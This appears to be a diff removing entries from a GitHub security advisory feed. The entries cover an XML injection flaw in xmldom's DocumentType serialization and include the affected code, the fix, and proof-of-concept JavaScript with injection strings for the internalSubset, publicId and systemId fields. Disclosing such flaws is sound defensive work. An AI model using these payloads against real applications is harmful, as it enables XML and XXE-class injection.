-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-const impl = new DOMImplementation();
-
-// internalSubset injection
-const dt1 = impl.createDocumentType('root', '', '', ']&gt;&lt;injected/&gt;&lt;![CDATA[');
-const doc1 = impl.createDocument(null, 'root', dt1);
-
-// Default (unchanged): verbatim — injection present
-console.log(new XMLSerializer().serializeToString(doc1));
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-
-// Opt-in guard: throws InvalidStateError
-try {
-  new XMLSerializer().serializeToString(doc1, { requireWellFormed: true });
-} catch (e) {
-  console.log(e.name, e.message);
-  // InvalidStateError: DocumentType internalSubset contains "]&gt;"
-}
-</code></pre>
-<p>The guard also covers post-creation property writes:</p>
-<pre><code class="language-js">const dt2 = impl.createDocumentType('root', '', '');
-dt2.systemId = '"sysid"&gt;&lt;injected attr="pwn"/&gt;';
-const doc2 = impl.createDocument(null, 'root', dt2);
-new XMLSerializer().serializeToString(doc2, { requireWellFormed: true });
-// InvalidStateError: DocumentType systemId is not a valid SystemLiteral
-</code></pre>
-<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
-<p>The W3C DOM Parsing and Serialization spec §3.2.1.3 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec permits verbatim serialization of DOCTYPE fields. Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
-<h3 id="residual-limitation">Residual limitation</h3>
-<p><code>createDocumentType(qualifiedName, publicId, systemId[, internalSubset])</code> does not validate <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> at creation time. This creation-time validation is a breaking change and is deferred to a future breaking release.</p>
-<p>When the default serialization path is used (without <code>requireWellFormed: true</code>), all three fields are still emitted verbatim. Applications that do not pass <code>requireWellFormed: true</code> remain exposed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-<li><a href="https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314">https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-22T20:19:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@xmldom/xmldom] xmldom has XML injection through unvalidated DocumentType serialization]]></title>
-        <id>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</id>
-        <link href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h"/>
-        <updated>2026-04-22T20:19:14.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The package serializes <code>DocumentType</code> node fields (<code>internalSubset</code>, <code>publicId</code>, <code>systemId</code>) verbatim
-without any escaping or validation. When these fields are set programmatically to attacker-controlled
-strings, <code>XMLSerializer.serializeToString</code> can produce output where the DOCTYPE declaration is
-terminated early and arbitrary markup appears outside it.</p>
-<hr>
-<h2 id="details">Details</h2>
-<p><code>DOMImplementation.createDocumentType(qualifiedName, publicId, systemId, internalSubset)</code> validates
-only <code>qualifiedName</code> against the XML QName production. The remaining three arguments are stored
-as-is with no validation.</p>
-<p>The XMLSerializer emits <code>DocumentType</code> nodes as:</p>
-<pre><code>&lt;!DOCTYPE name[ PUBLIC pubid][ SYSTEM sysid][ [internalSubset]]&gt;
-</code></pre>
-<p>All fields are pushed into the output buffer verbatim — no escaping, no quoting added.</p>
-<p><strong><code>internalSubset</code> injection:</strong> The serializer wraps <code>internalSubset</code> with <code> [</code> and <code>]</code>. A value
-containing <code>]&gt;</code> closes the internal subset and the DOCTYPE declaration at the injection point.
-Any content after <code>]&gt;</code> in <code>internalSubset</code> appears outside the DOCTYPE in the serialized output as
-raw XML markup. Reported by @TharVid (GHSA-f6ww-3ggp-fr8h). Affected: <code>@xmldom/xmldom</code> ≥ 0.9.0
-via <code>createDocumentType</code> API; 0.8.x only via direct property write.</p>
-<p><strong><code>publicId</code> injection:</strong> The serializer emits <code>publicId</code> verbatim after <code>PUBLIC</code> with no
-quoting added. A value containing an injected system identifier (e.g.,
-<code>"pubid" SYSTEM "evil"</code>) breaks the intended quoting context, injecting a fake SYSTEM entry
-into the serialized DOCTYPE declaration. Identified during internal security research. Affected:
-both branches, all versions back to 0.1.0.</p>
-<p><strong><code>systemId</code> injection:</strong> The serializer emits <code>systemId</code> verbatim. A value containing <code>&gt;</code>
-terminates the DOCTYPE declaration early; content after <code>&gt;</code> appears as raw XML markup outside
-the DOCTYPE context. Identified during internal security research. Affected: both branches, all
-versions back to 0.1.0.</p>
-<p>The parse path is safe: the SAX parser enforces the <code>PubidLiteral</code> and <code>SystemLiteral</code> grammar
-productions, which exclude the relevant characters, and the internal subset parser only accepts a
-subset it can structurally validate. The vulnerability is reachable only through programmatic
-<code>createDocumentType</code> calls with attacker-controlled arguments.</p>
-<hr>
-<h2 id="affected-code">Affected code</h2>
-<p><strong><code>lib/dom.js</code> — <code>createDocumentType</code> (lines 898–910):</strong></p>
-<pre><code class="language-js">createDocumentType: function (qualifiedName, publicId, systemId, internalSubset) {
-    validateQualifiedName(qualifiedName);          // only qualifiedName is validated
-    var node = new DocumentType(PDC);
-    node.name = qualifiedName;
-    node.nodeName = qualifiedName;
-    node.publicId = publicId || '';               // stored verbatim
-    node.systemId = systemId || '';               // stored verbatim
-    node.internalSubset = internalSubset || '';   // stored verbatim
-    node.childNodes = new NodeList();
-    return node;
-},
-</code></pre>
-<p><strong><code>lib/dom.js</code> — serializer DOCTYPE case (lines 2948–2964):</strong></p>
-<pre><code class="language-js">case DOCUMENT_TYPE_NODE:
-    var pubid = node.publicId;
-    var sysid = node.systemId;
-    buf.push(g.DOCTYPE_DECL_START, ' ', node.name);
-    if (pubid) {
-        buf.push(' ', g.PUBLIC, ' ', pubid);
-        if (sysid &amp;&amp; sysid !== '.') {
-            buf.push(' ', sysid);
-        }
-    } else if (sysid &amp;&amp; sysid !== '.') {
-        buf.push(' ', g.SYSTEM, ' ', sysid);
-    }
-    if (node.internalSubset) {
-        buf.push(' [', node.internalSubset, ']');  // internalSubset emitted verbatim
-    }
-    buf.push('&gt;');
-    return;
-</code></pre>
-<hr>
-<h2 id="poc">PoC</h2>
-<h3 id="internalsubset-injection">internalSubset injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '',
-    ']&gt;&lt;injected/&gt;&lt;![CDATA['
-);
-const doc = impl.createDocument(null, 'root', doctype);
-const xml = new XMLSerializer().serializeToString(doc);
-console.log(xml);
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-//                   ^^^^^^^^^^  injected element outside DOCTYPE
-</code></pre>
-<h3 id="publicid-quoting-context-break">publicId quoting context break</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '"injected PUBLIC_ID" SYSTEM "evil"',
-    '',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root PUBLIC "injected PUBLIC_ID" SYSTEM "evil"&gt;&lt;root/&gt;
-// quoting context broken — SYSTEM entry injected
-</code></pre>
-<h3 id="systemid-injection">systemId injection</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-
-const impl = new DOMImplementation();
-const doctype = impl.createDocumentType(
-    'root',
-    '',
-    '"sysid"&gt;&lt;injected attr="pwn"/&gt;',
-    ''
-);
-const doc = impl.createDocument(null, 'root', doctype);
-console.log(new XMLSerializer().serializeToString(doc));
-// &lt;!DOCTYPE root SYSTEM "sysid"&gt;&lt;injected attr="pwn"/&gt;&gt;&lt;root/&gt;
-// &gt; in sysid closes DOCTYPE early; &lt;injected/&gt; appears as sibling element
-</code></pre>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>An application that programmatically constructs <code>DocumentType</code> nodes from user-controlled data and
-then serializes the document can emit a DOCTYPE declaration where the internal subset is closed
-early or where injected SYSTEM entities or other declarations appear in the serialized output.</p>
-<p>Downstream XML parsers that re-parse the serialized output and expand entities from the injected
-DOCTYPE declarations may be susceptible to XXE-class attacks if they enable entity expansion.</p>
-<hr>
-<h2 id="fix-applied">Fix Applied</h2>
-<blockquote>
-<p><strong>⚠ Opt-in required.</strong> Protection is not automatic. Existing serialization calls remain
-vulnerable unless <code>{ requireWellFormed: true }</code> is explicitly passed. Applications that pass
-untrusted data to <code>createDocumentType()</code> or write untrusted values directly to a
-<code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> properties should audit
-all <code>serializeToString()</code> call sites and add the option.</p>
-</blockquote>
-<p><code>XMLSerializer.serializeToString()</code> now accepts an options object as a second argument. When <code>{ requireWellFormed: true }</code> is passed, the serializer validates the <code>DocumentType</code> node's <code>publicId</code>, <code>systemId</code>, and <code>internalSubset</code> fields before emitting the DOCTYPE declaration and throws <code>InvalidStateError</code> if any field contains an injection sequence:</p>
-<ul>
-<li><strong><code>publicId</code></strong>: throws if non-empty and does not match the XML <code>PubidLiteral</code> production (XML 1.0 [12])</li>
-<li><strong><code>systemId</code></strong>: throws if non-empty and does not match the XML <code>SystemLiteral</code> production (XML 1.0 [11])</li>
-<li><strong><code>internalSubset</code></strong>: throws if it contains <code>]&gt;</code> (which closes the internal subset and DOCTYPE declaration early)</li>
-</ul>
-<p>All three checks apply regardless of how the invalid value entered the node — whether via <code>createDocumentType</code> arguments or a subsequent direct property write.</p>
-<h3 id="poc--fixed-path">PoC — fixed path</h3>
-<pre><code class="language-js">const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');
-const impl = new DOMImplementation();
-
-// internalSubset injection
-const dt1 = impl.createDocumentType('root', '', '', ']&gt;&lt;injected/&gt;&lt;![CDATA[');
-const doc1 = impl.createDocument(null, 'root', dt1);
-
-// Default (unchanged): verbatim — injection present
-console.log(new XMLSerializer().serializeToString(doc1));
-// &lt;!DOCTYPE root []&gt;&lt;injected/&gt;&lt;![CDATA[]&gt;&lt;root/&gt;
-
-// Opt-in guard: throws InvalidStateError
-try {
-  new XMLSerializer().serializeToString(doc1, { requireWellFormed: true });
-} catch (e) {
-  console.log(e.name, e.message);
-  // InvalidStateError: DocumentType internalSubset contains "]&gt;"
-}
-</code></pre>
-<p>The guard also covers post-creation property writes:</p>
-<pre><code class="language-js">const dt2 = impl.createDocumentType('root', '', '');
-dt2.systemId = '"sysid"&gt;&lt;injected attr="pwn"/&gt;';
-const doc2 = impl.createDocument(null, 'root', dt2);
-new XMLSerializer().serializeToString(doc2, { requireWellFormed: true });
-// InvalidStateError: DocumentType systemId is not a valid SystemLiteral
-</code></pre>
-<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
-<p>The W3C DOM Parsing and Serialization spec §3.2.1.3 defines a <code>require well-formed</code> flag whose <strong>default value is <code>false</code></strong>. With the flag unset, the spec permits verbatim serialization of DOCTYPE fields. Unconditionally throwing would be a behavioral breaking change with no spec justification. The opt-in <code>requireWellFormed: true</code> flag allows applications that require injection safety to enable strict mode without breaking existing deployments.</p>
-<h3 id="residual-limitation">Residual limitation</h3>
-<p><code>createDocumentType(qualifiedName, publicId, systemId[, internalSubset])</code> does not validate <code>publicId</code>, <code>systemId</code>, or <code>internalSubset</code> at creation time. This creation-time validation is a breaking change and is deferred to a future breaking release.</p>
-<p>When the default serialization path is used (without <code>requireWellFormed: true</code>), all three fields are still emitted verbatim. Applications that do not pass <code>requireWellFormed: true</code> remain exposed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/xmldom/xmldom/security/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-<li><a href="https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314">https://github.com/xmldom/xmldom/commit/372008f9ae0e20fd69f761c7b79e202598267314</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.13">https://github.com/xmldom/xmldom/releases/tag/0.8.13</a></li>
-<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.10">https://github.com/xmldom/xmldom/releases/tag/0.9.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-f6ww-3ggp-fr8h">https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f6ww-3ggp-fr8h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-22T20:19:12.000Z</published>
     </entry>
 </feed>
